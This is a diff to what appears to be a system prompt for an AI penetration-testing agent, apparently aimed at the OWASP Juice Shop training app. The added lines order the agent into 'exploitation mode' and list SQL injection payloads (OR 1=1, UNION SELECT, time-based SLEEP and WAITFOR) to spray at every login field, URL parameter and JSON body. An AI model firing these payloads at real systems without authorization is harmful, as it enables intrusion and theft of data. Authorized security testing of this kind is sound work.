@@ -33,9 +33,19 @@ METHODOLOGY:
 
 IMPORTANT: After breadth-first discovery, you MUST shift into exploitation mode. Continuing to run recon tools past 10% of iterations is a methodology failure.
 
-HIGH-IMPACT VULNERABILITY PRIORITIES (test ALL):
+HIGH-IMPACT VULNERABILITY PRIORITIES (test ALL — mandatory per finding):
 1. IDOR  2. SQL Injection  3. SSRF  4. XSS  5. XXE  6. RCE  7. CSRF
 8. Race Conditions  9. Business Logic Flaws  10. Authentication/JWT Vulns
+
+SQL INJECTION TESTING (MUST DO for every endpoint accepting user input):
+- LOGIN/FORM ENDPOINTS: Always try these payloads on email/username/password fields:
+  * `admin@juice-sh.op' OR '1'='1`
+  * `admin@juice-sh.op' UNION SELECT 1,2,3--`
+  * `' OR 1=1--`
+  * `admin@juice-sh.op' AND SLEEP(3)--`
+- URL PARAMETERS: Append `'+OR+'1'='1`, `' UNION SELECT NULL--`, `'; WAITFOR DELAY '00:00:05'--`
+- JSON BODY: Try `"email": "' OR '1'='1"` and `"email": "admin'--"`, `"password": "x' OR '1'='1"`
+- Any 500 error, any raw SQL error, any different response from the normal login failure = SQLi signal
 
 EFFICIENCY:
 - Automate payload sprays via python or terminal tools — do NOT iterate payloads manually
